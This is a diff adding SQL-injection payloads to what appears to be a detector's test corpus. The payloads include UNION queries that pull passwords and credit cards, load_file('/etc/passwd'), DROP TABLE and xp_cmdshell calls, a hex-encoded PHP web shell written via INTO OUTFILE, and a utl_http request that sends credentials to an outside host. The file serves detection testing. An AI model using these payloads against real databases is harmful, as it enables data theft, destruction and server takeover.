@@ -140,8 +140,8 @@ a%27%2B%27b
 ' OR 1='1
 
 # new variations
-X' != 'Y' = 0 = 1
-X' = 'X' = 0 = 1
+X' != 'Y' = 0 = '1
+X' = 'X' = 0 = '1
 X' = 'X' = 'X' = 0 = '1
 X' - 'Y' - 0 = '1
 
@@ -217,3 +217,367 @@ test'-'xyz' union (select table)
 @version- 'xxx' union(select table_name from information_schema.tables limit 1,1)
 @version - 5 union(select table_name from information_schema.tables limit 1,1)
 
+#
+1 into outfile 'asd'
+1 into outfile 'asd'--
+'1' into outfile 'asd'
+'1' into outfile 'asd' --
+@version into outfile 'asd'
+@version into outfile 'asd' --
+
+1 into outfile ('asd')
+'1' into outfile ('asd')
+@version into outfile ('asd')
+
+1 into outfile substring('asd', 10, 1)
+'1' into outfile substring('asd', 10, 1)
+@version into outfile substring('asd', 10 1)
+
+1 into outfile (substring('asd', 10, 1))
+'1' into outfile (substring('asd', 10, 1))
+@version into outfile (substring('asd', 10 1))
+
+%28select+substr%0D%0A%28login%0D%0A%0D%0A%29%0D%0Afrom+users+limit+1%2C1%29
+union%20%28select+id+from+users+limit+1%2C1%29
+
+#
+# This is not valid SQL but designed to force a syntax error
+# http://www.modsecurity.org/testphp.vulnweb.com/listproducts.php?cat=1%0Aand+current_user=notthere()
+1%0Aand+current_user=notthere()
+1%0Aand+current_user=1
+1%0Aand+current_user=@version
+1%0Aand+current_user='junk'
+1%0Aand+current_user=foo
+
+
+
+1--%0a+union%0C-%28%20select+table_name+from+information_schema.tables+limit+1%2C1%29
+1'--%0a+union%0C-%28%20select+table_name+from+information_schema.tables+limit+1%2C1%29
+@version--%0a+union%0C-%28%20select+table_name+from+information_schema.tables+limit+1%2C1%29
+
+-.1a%20union%20%28select+id+from+users+limit+1%2C1%29
+
+case 1 when 2 then 2 end
+case sin(1) when 2 then 2 end
+case '1' when 2 then 2 end
+case 1 when 's' then 2 end
+case when 2 then 3 end
+case when 's' then 3 end
+case when f(1) then 3 end
+
+-1 union select table_name asda from information_schema.tables
+-1 union select table_name "asda" from information_schema.tables
+-1 union select table_name `asda` from information_schema.tables
+-1 union select table_name as asda from information_schema.tables
+-1 union select table_name as "asda" from information_schema.tables
+-1 union select table_name as `asda` from information_schema.tables
+
+a'and(select(binary(/*!system_user()*/)))like'reading%
+
+-1 union select @``"", table_name from information_schema.tables
+'foo' union select @``"", table_name from information_schema.tables
+@version union select @``"", table_name from information_schema.tables
+
+select @version foo
+select @version "foo"
+select @version foo -- junk
+select @version "foo" -- junk
+
+$$pgsql evade$$ union select * from foo
+$foo$pgsql evade$foo$ union select * from foo
+
+u&'pgsql evade' union select * from foo
+U&'pgsql evade' union select * from foo
+
+U&'pgsql evade' uescape '!' union select * from foo
+
+_latin1'foo' union select * from foo
+_LATIN7'foo' union select * from foo
+_utf8'foo' union select * from foo
+
+REAL 1 union select * from foo
+1::REAL union select * from foo
+1::REAL::REAL union select * from foo
+
+-1 union select @``"", table_name from information_schema.tables
+!~1 union select table_name from information_schema.tables
+-1 union select @a`from 1`, table_name from information_schema.tables
+version() union select table_name from information_schema.tables
+-1 LOCK IN SHARE MODE UNION SELECT table_name from information_schema.tables
+1 is unknown union select table_name from information_schema.tables
+true is not unknown for update union select table_name from information_schema.tables
+1 for update union select 1
+
+# ht/ TK
+(true)-(true)union select table_name from information_schema.tables
+(@a)-(@a)union select table_name from information_schema.tables
+
+# ht/ @stamparm
+1 OR (1 OR 1)--
+(1) OR (1 OR 1)--
+((1) OR (1 OR 1))--
+((1) OR ((1 OR 1)))--
+1 OR ((1 OR 1)) --
+1 OR ((1) OR 1) --
+
+# ht/ @stamparm
+(@x OR @y) UNION ALL SELECT name,email,password FROM users-- 
+(@x OR (@y)) UNION ALL SELECT name,email,password FROM users-- 
+((@x) OR @y) UNION ALL SELECT name,email,password FROM users-- 
+(@x) OR (@y) UNION ALL SELECT name,email,password FROM users-- 
+@x) OR (@y) UNION ALL SELECT name,email,password FROM users-- 
+@x OR (@y) UNION ALL SELECT name,email,password FROM users--
+
+# ht/ @stamparm
+(SELECT 1 FROM DUAL)
+(SELECT @a FROM DUAL) UNION ALL SELECT 1, 2, 3--
+(SELECT (1) FROM DUAL)
+(select @version from dual)
+(select (@version - 1) from dual)
+(select ('foo' - 1) from dual)
+(select 'foo' from dual)
+(select 1 foobar from dual)
+
+# previously had problems with operators made from two words
+# ht/@stamparm
+1 and 1 not between 0 and 1
+1 AND 1 SOUNDS LIKE 1
+1 AND 1 NOT LIKE 0
+
+(1 AND 1) OR 2>1--
+
+# ht/@FluxReiners
+'-(1 or 1) and 1=0 union select load_file('/etc/passwd'),credit_card,password from users-- -
+'-(-1 or -1) and 1=0 union
+'-(-(1) or -1) and 1=0 union
+'-((1) or -1) and 1=0 union
+
+# https://twitter.com/dsrbr/status/342132003270959104
+-1 union select null, listagg(login || ':' || pass,', ') within group (order by login) from users;
+-1 union select null, xmlagg(xmlelement("user",login || ':' || pass).getStringVal() from users;
+-1 union select null, stragg(login || ':' || pass ||', ') from users;
+
+-1 union select listagg(login || ':' || pass,', ') within group (order by login) from users;
+
+#ht ivan
+users.id%0D%0A%23asd%0D%0Aunion%0D%0A%23asd%0D%0Aselect%0D%0A%23asd%0D%0A--a-%0D%0A%23aaa%0D%0Aaa+%0D%0A%23asd%0D%0A--a-%0D%0A%23aaa%0D%0Afrom%0D%0A%23asd%0D%0A--a-%0D%0A%23aaa%0D%0Aasdasd
+
+# http://samincube.blogspot.ru/2013/06/time-based-sqli-on-google-coupon.html
+1'=sleep(1)='1
+
+# https://twitter.com/dsrbr/status/343017094926962691
+1 and select (utl_http.request('http://client9.com/') || select listagg(login || chr(58) || pass || ', ') within group  (order by login)  from dual) is not null;
+
+# https://twitter.com/dsrbr/status/341228356936814592
+-1 union select top 1 null, lead(pass, 0) over (order by pass) from users;
+
+# https://twitter.com/dsrbr/status/340018970054766592
+-1 union select null, array_to_json(array_agg(users))::text from users limit 1;
+1 and (select array_to_json(array_agg(users))::text::bool from users limit 1;
+
+# http://www.exploit-db.com/exploits/25915/
+' UNION SELECT 0x3c3f7068702073797374656d28245f4745545b227272225d293b3f3e,null,null,null,null,null,null,null,null,null,null,null,null,null INTO OUTFILE 'afile.php'
+
+# http://blog.detectify.com/post/51651525114/the-ultimate-sql-injection-payload
+IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1))/*'XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR'|"XOR(IF(SUBSTR(@@version,1,1)<5,BENCHMARK(2000000,SHA1(0xDE7EC71F1)),SLEEP(1)))OR"*/
+
+# misc secondary sql statements
+1 and true; BEGIN DECLARE @xy varchar(8000)
+1; BEGIN DECLARE @xy varchar(8000)
+x' and 1 = 0; BEGIN DECLARE
+x' AND 1=0; DROP TABLE TMP_DB;
+' AND 1=0; DECLARE @S VARCHAR(4000) SET @S
+
+' IF EXISTS (SELECT 1 FROM INFORMATION_SCHEMA.TABLES WHERE 
+
+# https://twitter.com/st1ll_di3/status/344416764949561346
+# http://pastebin.com/Ymcs7nE0
+(--- 0)'=(currenT_user()-3) union select 1,2,3 from users; -- -
+
+# example from http://www.websec.ca/kb/sql_injection
+1=1 AND-+-+-+-+~~((1))
+
+# the bizarre sp_password hackery
+1-- foo sp_password
+1'--sp_password
+
+# nice ms-access, courtesy mod-security
+foo' Eqv StrComp(username, 0x12+0x34+0xab+0xcd,0) Imp 'a
+
+# mysql and pgsql string litterals
+b'1' UNION SELECT 1
+x'1' UNION SELECT 1
+n'1' UNION SELECT 1
+
+# ending clauses
+1 having 1 limit 1 union select 1--
+1 having (1) limit 1 union select 1--
+1 having -(1) limit 1 union select 1--
+1 having sin(1) limit 1 union select 1--
+1 having 1 limit 2 group by 3 union select 1--
+1 group by 2 union select 1 --
+sin(1) group by 1 union select 1--
+@version group by 1 union select 1--
+@version group by (-1) union select 1--
+(@version) group by -1 union select 1--
+(@version) group by (-1) union select 1--
+(@version)) group by (-1) union select 1--
+(1)) group by (-1) union select 1--
+(@version) group by sin(-1) union select 1--
+1 group by sin(1) union select 1--
+1 group by 1 - sin(1) union select 1--
+1 group by (sin(1)) union select 1--
+-1 group by -(-sin(1)) union select 1--
+sin(1) group by (-sin(1)) union select 1--
+sin(1)-1 group by (-sin(1)) union select 1--
+sin(1)-1 group by 1 union select 1--
+1 group by ((1)) union select 1--
+1 group by (((1))) union select 1--
+((1)) group by (1) union select 1--
+(1) group by ((1)) union select 1--
+(1) group by (1) union select 1--
+
+# more with 'having'
+-(1) is not unknown having 1 order by 1 limit 1 for update  UNION select table_name from information_schema.tables limit 1
+-(1) is not unknown  UNION select table_name from information_schema.tables limit 1
+-(1) is not unknown  for update  UNION select table_name from information_schema.tables limit 1
+-(1) is not unknown having 1 order by 1 limit 1  UNION select table_name from information_schema.tables limit 1
+-(1) is not unknown having 1  UNION select table_name from information_schema.tables limit 1
+-(1) is not unknown UNION select table_name from information_schema.tables limit 1
+-(1) is not unknown having 1 UNION select table_name from information_schema.tables limit 1
+-(1) is unknown having 1 UNION select table_name from information_schema.tables limit 1
+-(1) for update  UNION select table_name from information_schema.tables limit 1
+1 for update UNION select table_name from information_schema.tables limit 1
+
+-(1) for update UNION select table_name from information_schema.tables limit 1
+-(true) for update UNION select table_name from information_schema.tables limit 1
+-(null) for update UNION select table_name from information_schema.tables limit 1
+-(\N) for update UNION select table_name from information_schema.tables limit 1
+-(\N) for update having true UNION select table_name from information_schema.tables limit 1
+-(\N) for update having 1 UNION select table_name from information_schema.tables limit 1
+-(1) for update having 1 UNION select table_name from information_schema.tables limit 1
+-(1)  having 1 for updateUNION select table_name from information_schema.tables limit 1
+-(1)  having 1 for update UNION select table_name from information_schema.tables limit 1
+-(1) having 1 for update UNION select table_name from information_schema.tables limit 1
+
+\''; DROP TABLE users; --
+\''); DROP TABLE users; --
+\''; /* one */ ;DROP TABLE users; --
+\''; select 1; drop table users; --
+1; USE master; EXEC xp_cmdshell 'copy c:\SQLbcks\AdvWorks.bck
+1; EXECUTE AS LOGIN 'root'; GO xp_cmdshell 'whoami.exe' ; REVERT ;
+1; USE master; EXEC xp_cmdshell 'copy c:\SQLbcks\AdvWorks.bck
+1); USE master; EXEC xp_cmdshell 'copy c:\SQLbcks\AdvWorks.bck
+
+EXEC sp_add_job @job_name = 'TestJob';
+EXECUTE sp_add_job @job_name = 'TestJob';
+1;EXECUTE sp_add_job @job_name = 'TestJob';
+1;print 'foo'; exec xp_cmdshell 'destroy';
+
+# nested sub-selects
+-1 - (select (1 - select (select 1))) union all select 2 --
+-1 - (select 1) - union all select 2 --
+(select 1) - 1 union all select 2 --
+((select 1) - 1) + (select 1) union all select 2 --
+(select (select (select 1))) union all select 2 --
+(select (select (select 1))) union all select 2 --
+(select ((select (select 1))) union all select 2 --
+(select (select ((select 1))) union all select 2 --
+(select ((select 1 - (select 1))) union all select 2 --
+(select (select (((select 1))) union all select 2 --
+(select ((select (select 1))) union all select 2 --
+(select (((select (select 1))) union all select 2 --
+(select (select (1 - select 1))) union all select 2 --
+(select (select 1 - (select 1))) union all select 2 --
+(select 1 - (select 1 - (select 1))) union all select 2 --
+
+# moar unions
+-1 union distinct select table_name from information_schema.tables
+-1 union distinct all select table_name from information_schema.tables
+-1 union all distinct select table_name from information_schema.tables
+-1 union all select table_name from information_schema.tables
+
+# more
+if(1, -1, 2) union select table_name from information_schema.tables limit 1
+if((1), -1, 2) union select table_name from information_schema.tables limit 1
+if(1=2, -1, 2) union select table_name from information_schema.tables limit 1
+true in(2, (select 2)) union select table_name from information_schema.tables limit 1
+true in(2, 1) union select table_name from information_schema.tables limit 1
+
+#
+-1 union select current_user``union select table_name from information_schema.tables
+
+if(1, 1, 2) union select 3
+if(sin(1), 1, 2) union select 3
+if(1, sin(1), 2) union select 3
+if(1 - sin(1), 2) union select 3
+if((1), 1, 2) union select 3
+if(-(1), 1, 2) union select 3
+
+#
+1; if exists ( /* anything */
+
+# these aren't SQL but close enough
+union (select 1)--
+union all (select 1)--
+union all (select distinct 1)--
+union (select 1,2,3,4,5)--
+union (select -1,2,3,4,5)--
+union (select -(1),2,3,4,5)--
+union (select -sin(1),2,3,4,5)--
+1;call p(@version, @a)
+1;load data infile "foo"
+1;load xml infile "foo"
+1;load xml local infile "foo"
+1;load xml low_priority infile "foo"
+1;load xml concurrent infile "foo"
+1; delete from foo
+1; delete low_priority from foo
+1; delete quick from foo
+1; delete ignore from foo
+
+
+1;do (1=1)
+
+-0b01 for update union select table_name from information_schema.tables limit 1
+binary _latin1 'true' COLLATE latin1_german2_ci is not unknown union select table_name from information_schema.tables
+binary true COLLATE latin1_german2_ci union select table_name from information_schema.tables
+1<binary 1>2 union select table_name from information_schema.tables limit 1
+binary 1 < binary 2 > binary 3 union select table_name from information_schema.tables limit 1
+
+binary (false) union select table_name from information_schema.tables limit 1
+1 - binary (false) union select table_name from information_schema.tables limit 1
+1 - (binary (false)) union select table_name from information_schema.tables limit 1
+binary binary 1 union select table_name from information_schema.tables
+binary -1 union select table_name from information_schema.tables
+binary -(1) union select table_name from information_schema.tables
+binary (binary 1) union select table_name from information_schema.tables
+binary (binary 1) union select table_name from information_schema.tables
+
+# werid slash escaping in Older T-SQL databases
+# http://websec.ca/kb/sql_injection#MSSQL_Allowed_Intermediary_Chars_AND-OR
+\1=\1AND\1=\1;
+
+# more weird T-SQL weirdness
+\%0=\-1AND\*1=\/1
+
+# mysql
+-1 procedure analyse() union select table_name from information_schema.tables limit 1
+
+# HT @FluxReiners
+(1)mod @a or 1 union select load_file('/etc/passwd'),credit_card,passwd from users-- -
+@a mod (1) or 1 union select load_file('/etc/passwd'),credit_card,passwd from users-- -
+
+# HT @LightOS
+# issue here is how '1gfsdg..' is processed.
+# MySQL parses it as a single word, other databases treat it as "1", "gfs..."
+-1 procedure analyse(1gfsdgfds, sfg) union select table_name from information_schema.tables limit 1
+
+# HT @FluxReiners
+(select 1 foo) union select load_file('foo');
+
+#
+# Anonymous from  Research Institution of Telecom in Beijing, China
+#
+=1 union select admin,pass from admin limit 1
+=1 union select 1,2,3,4,5,6
